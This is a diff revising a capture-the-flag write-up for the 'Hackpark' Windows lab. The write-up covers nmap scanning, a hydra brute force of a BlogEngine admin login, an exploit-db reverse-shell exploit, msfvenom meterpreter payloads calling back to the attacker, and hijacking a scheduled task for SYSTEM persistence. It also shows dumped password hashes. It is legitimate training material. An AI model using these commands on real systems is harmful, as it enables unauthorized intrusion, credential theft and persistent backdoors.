@@ -9,16 +9,16 @@ draft: false
 ---
 
 ## Introduction:
-The Hackpark challenge was deceptively simple to start with. I felt that I had made a ton of ground early on to establish a foothold on the host but discovering a pivot point from a low-privileged user to System took me a significantly longer time. However, it was satifsying to find as the escalation point could function as a persistent high privileged backdoor.
+The Hackpark challenge was deceptively simple in the initial exploratory phase. I had gained a ton of ground early on while I established a foothold on the host but discovering a pivot point from a low-privileged user to System took me significantly longer, primarily due to my unfamiliarity with Windows.
 
 ## Environment
-The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the the target host which I knew contained 2 flags to capture. Nothing else was known about the host prior to the attack other than that the host was most likely a Windows host.
+The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the the target host. Nothing else was known about the host prior to the attack other than that the host was most likely a Windows host.
 
 ## Attack 
-Prior to starting initial recon, I opened up a metasploit console and connected it to the msfdb postgres backend to gather any information that I had found.
+Prior to starting initial recon, I opened up a metasploit console and connected it to the msfdb postgres backend to gather any information that I had found into a single point. I also had setup burp suite to run on port 8080 and configured the local CA in Firefox.
 
 ### Host enumeration
-I started with an initial SYN, OS and Version scan of the host to attempt to identify at a high level what I was looking at.
+After this initial setup, I started with a SYN, OS and Version scan of the host to attempt to identify at a high level what I was looking at.
 
 ```
 msf5 > db_nmap -sS -sV -O 10.10.167.66
@@ -36,25 +36,25 @@ msf5 > db_nmap -sS -sV -O 10.10.167.66
 [*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .ress (1 host up) scanned in 30.92 seconds
 ```
 
-This quickly pointed out that the host was a Windows server, most likely Server 2012 and that it was running an open HTTP and RDP server. It also pointed out that there was a `robots.txt` link with a few entries.
+This quickly confirmed that the host was a Windows server, most likely Server 2012 and that it was running an HTTP and RDP server. It also pointed out that there was a `robots.txt` link with a few entries.
 
-While this was a fairly small footprint, I decided to kick off a broader portscan covering ports `1-65535` to make sure I hadn't missed anything and then decided to check out what the site had to offer.
+While this was a fairly small footprint, I decided to kick off a broader portscan covering ports `1-65535` to make sure I hadn't missed anything while I checked out what the website had to offer.
 
 #### Clicking around the site
-I opened the site to firefox and burp suite to be greeted by a less-than-pleasant clown face.
+I opened the site to firefox to be greeted by a less-than-pleasant clown face.
 
 ![hack park index](/img/hackpark_http_index.png)
 
-This looked to be a basic blog site, so I decided to investigate further by performing some happy path crawling around the site. This quickly lead me to an admin login page that also provided password recovery page.
+This looked to be a basic blog, so I decided to do some happy path crawling around the site to build up a sitemap in burp as well as my own mental map of the site. Shortly after I found an admin login page that also provided a password recovery link.
 
-I tried a few simple usernames and found that `admin` returned a different result than any of the others.
+I decided to play around with the password recovery and found that `admin` returned a different result than any of the other users I had attempted.
 
 ![hack park password retreival](/img/hackpark_http_password_retrieval.png)
 
-Given this user supposed user, and that the earlier broad scan yielded nothing, I supposed it would be worthwhile to kick off a dictionary attack in the background against the `admin` user while I continued to dig around in the site..
+Given this supposed user, and that the earlier broad scan yielded nothing, I chose to kick off a background dictionary attack against the `admin` user while I continued to dig around in the site.
 
 ### Brute forcing the login page
-I returned to the login page and tried a `admin:test` login to try to identify an element that I could use for a failure parameter in hydra. Failed logins spit out a very simple to match `Login failed` string. I then grabbed the rest of the post body from Burp and started a brute with hydra, using rockyou as the source dictionary.
+I returned to the login page and tried an `admin:test` login to try to identify an element that I could use for a failure parameter in hydra. Failed logins spit out a very simple to match `Login failed` string. I grabbed the rest of the post body from Burp and started a brute with hydra, using rockyou as the source dictionary.
 
 ```
 [*] exec: hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.167.66 http-post-form "/Account/login.aspx:__VIEWSTATE=n0dSQaeIUU9td9IiqqxUjQRLt5Vfe9tKftxi264M8uj5KA0zULHSKHjNdqwkzcbSpoimIX3xFLnJz6eAk2EmBlJx3HWWy14YxvnbwBNZczvzFuWjEwLsnVK622pYz9Cw7VQBjYDmS0PHqL0lcA5jxvCn9ILgh4J5Oh8k66K0JOnmXtVC&__EVENTVALIDATION=xjUAebAft2KQN5MffRGhUH5IgDIw1wmzjlNgpt8Vb4N2656viCANryx5yExK93%2BExMUVpVlU%2B%2BHh7jZwqAaf0sH%2Fmg1JISBvUobZVuCj573XBsDtL%2BRyJMOr%2BNWlN4XXAuWjifxkURjzlElA8RJsOQnoIxK8J2daZrZu0wEFAHgf62F0&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
@@ -69,14 +69,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-18 22:28:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-18 22:29:01
 ``` 
 
-This quickly yielded a password that allowed me to access the admin page of the site
+This quickly yielded a password that allowed me to access the admin page of the site before I could even continue poking around.
 
 ### Gaining a foothold
-At this point I was wholy unfamiliar with blogengine but by clicking around, I was able to find an about page that gave me some information about what the service version was and who it was running as.
+I was wholy unfamiliar with blogengine but by clicking around, I was able to find an `about` page that gave me information about what the service version was and who it was running as. With this information in hand, I decided to check exploitdb for anything of value.
 
 ![hackpark blogengine admin](/img/hackpark_http_blogengine.png)
-
-With this information in hand, I decided to check exploitdb for anything of value.
 
 ```
 root@kali:~/ctf/exploits# searchsploit blogengine -w
@@ -96,9 +94,9 @@ BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                      
 Shellcodes: No Results
 ```
 
-A few of these looked extremely interesting, especially [47011](https://www.exploit-db.com/exploits/47011) which included a python script that was prepared with a vulnerable theme that executed a reverse shell. I pulled this script down and fixed a small error where a `=================================` string was left uncommented.
+A few of these looked extremely interesting, as they provided remote code execution via a vulnerable theme cookie. Especially [47011](https://www.exploit-db.com/exploits/47011) which included a python script that automated the theme upload via a simple to use cli and already had a reverse shell command staged. I pulled this script down and fixed a small error where a `=================================` string was left uncommented.
 
-I started up a netcat listener in a new window and attempted to trigger the RCE.
+I then started up a netcat listener in a new window to catch a shell and attempted to trigger the RCE.
 
 ```
 root@kali:~/ctf/exploits# python 47011.py -t $ATTACKTARGET -u admin -p 1qaz2wsx -l 10.10.7.59:443
@@ -114,13 +112,13 @@ c:\windows\system32\inetsrv>whoami
 iis apppool\blog
 ```
 
-While this gave me a shell on the host, my goal became to escalate this shell to something a bit stabler. Preferably a meterpreter shell. With this in mind I decided to craft a new exe reverse shell that I could catch with meterpreter. In conjunction, I started a listener in msfconsole on port 4444
+While this gave me a shell on the host, it was about as limited as it could be. My goal became to escalate this shell to something a bit stabler. Preferably a meterpreter shell. With this in mind I decided to craft a new executable reverse shell that I could catch with the `multi/handler`. I started a listener in msfconsole on port 4444 in preparation.
 
 ```
 root@kali:~/ctf/transfer# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.7.59 LPORT=4444 -f exe -o hello.exe
 ```
 
-With an exploit in hand, I decided to attempt to transfer it using impacket's smb server.
+With an exploit ready, I decided to attempt to transfer it using impacket's smb server.
 
 ```
 root@kali:~/ctf/transfer# impacket-smbserver -smb2support TX $PWD
@@ -162,6 +160,7 @@ c:\Windows\Temp>dir
 copy \\10.10.7.59\TX\hello.exe hello.exe
 c:\Windows\Temp>copy \\10.10.7.59\TX\hello.exe hello.exe
         1 file(s) copied.
+.\hello.exe
 ```
 
 After executing `hello.exe`, I was able to catch the meterpreter shell which I then quickly tried to migrate to a _slightly_ stabler process. However being attached to the `cmd.exe` process still had me worried about stability.
@@ -226,7 +225,7 @@ meterpreter > migrate 1488
 ```
 
 ### Local Enumeration
-Now that I had a achieved slightly stabler shell, I decided to start poking around the machine for a better escalation. I began this by using the new meterpreter shell to upload a copy of `winPEAS` to see if anything major stood out to me on the host.
+Now that I had achieved slightly stabler shell, I decided to start poking around the machine for a better escalation vector. I began this by using the new meterpreter shell to upload a copy of `winPEAS` to see if anything major stood out to me on the host.
 
 I've truncated some of the `winPEAS` output for brevity.
 
@@ -246,16 +245,6 @@ Microsoft Windows [Version 6.3.9600]
 
 c:\windows\temp>.\winPEAS.exe
 ...
-  [+] Home folders found
-    C:\Users\.NET v4.5
-    C:\Users\.NET v4.5 Classic
-    C:\Users\Administrator
-    C:\Users\All Users
-    C:\Users\Default
-    C:\Users\Default User
-    C:\Users\jeff
-    C:\Users\Public : Service [WriteData/CreateFiles]
-
   [+] Looking for AutoLogon credentials
     Some AutoLogon credentials were found!!
     DefaultUserName               :  administrator
@@ -289,7 +278,25 @@ In addition to a ton of information about the host, there appears to be an admin
 
 ### Attacking WScheduler
 I started by taking a look at the `WScheduler` service 
+
 ```
+c:\Program Files (x86)\SystemScheduler>sc qc WindowsScheduler
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WindowsScheduler
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : System Scheduler Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
+
+```
+
 meterpreter > cd PrograProgram Files  "Program Files (x86)" 
 meterpreter > cd SystemScheduler 
 meterpreter > ls
@@ -339,25 +346,7 @@ Mode              Size     Type  Last modified              Name
 100666/rw-rw-rw-  6574     fil   2019-08-04 11:36:42 +0000  whiteclock.ico
 ```
 
-Once in the directory, I started trying to figure out what the service did as there were a ton of executable files that could be potential vectors. The most obvious seemed to be `WService` however I currently wasn't able to restart the service so I wasn't yet sure how I would exploit `WService`.
-
-```
-c:\Program Files (x86)\SystemScheduler>sc qc WindowsScheduler
-[SC] QueryServiceConfig SUCCESS
-
-SERVICE_NAME: WindowsScheduler
-        TYPE               : 10  WIN32_OWN_PROCESS 
-        START_TYPE         : 2   AUTO_START
-        ERROR_CONTROL      : 0   IGNORE
-        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
-        LOAD_ORDER_GROUP   : 
-        TAG                : 0
-        DISPLAY_NAME       : System Scheduler Service
-        DEPENDENCIES       : 
-        SERVICE_START_NAME : LocalSystem
-```
-
-I took a look at `LogFile.txt` which lead me to believe it didn't restart frequently on its own.
+Once in the directory, I started trying to identify what the service did as there were a ton of executable files that could be potential vectors. The most obvious seemed to be `WService` however I currently wasn't able to restart the service so I wasn't yet sure how I would exploit it. I took a look at `LogFile.txt` which lead me to believe it didn't restart frequently on its own.
 
 ```
 meterpreter > cat LogFile.txt
@@ -386,7 +375,7 @@ meterpreter > cat LogFile.txt
 11/18/20 14:11:57,Starting System Scheduler SERVICE (SYSTEM)
 ```
 
-I then looked under the `Events` directory where I found a log file that indicated the `Message.exe` binary was executed approximately every 30 seconds as the administrative user. This binary was overwritable and appeared to be a perfect vector to attack for an administrative user.
+I then looked under the `Events` directory where I found a log file that indicated the `Message.exe` binary was executed approximately every 30 seconds as the administrative user. This binary was overwritable and appeared to be a perfect vector to attack for an administrative shell.
 
 ```
 meterpreter > cd Events 
@@ -418,7 +407,7 @@ meterpreter > cat 20198415519.INI_LOG.txt
 11/18/20 15:02:01,Event Started Ok, (Administrator)
 ```
 
-I generated a new binary called Message.exe that pointed at port 4443, started a second listener on this port
+I generated a new binary called Message.exe that included a meterpreter payload that connected back to port 4443 and started a second listener on this port
 
 ```                                                   
 root@kali:~/ctf/transfer# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.7.59 LPORT=4443 -f exe -o Message.exe
@@ -519,4 +508,4 @@ jeff:1001:aad3b435b51404eeaad3b435b51404ee:e7dd0bd78b1d5d7eea4ee746816e2377:::
 ```
 
 ## Summary
-This host was interesting solely due to the potential that Scheduler service provided. By functioning like cron I was able to trigger a connection attempt at a 30second interval giving me persistence for as long as that job was running the same binary. One thing I could have tried to do further was leverage templating in msfvenom to persist the binary with a backdoor added. All in all this was a fun way for me to continue experimenting with windows hosts.
+This host was interesting solely due to the potential that Scheduler service provided. By functioning like cron I was able to trigger a connection attempt at a 30 second interval giving me persistence for as long as that job was running the same binary. One thing I could have tried to do further was leverage templating in msfvenom to persist the binary with a backdoor added. All in all this was a fun way for me to continue experimenting with windows hosts.
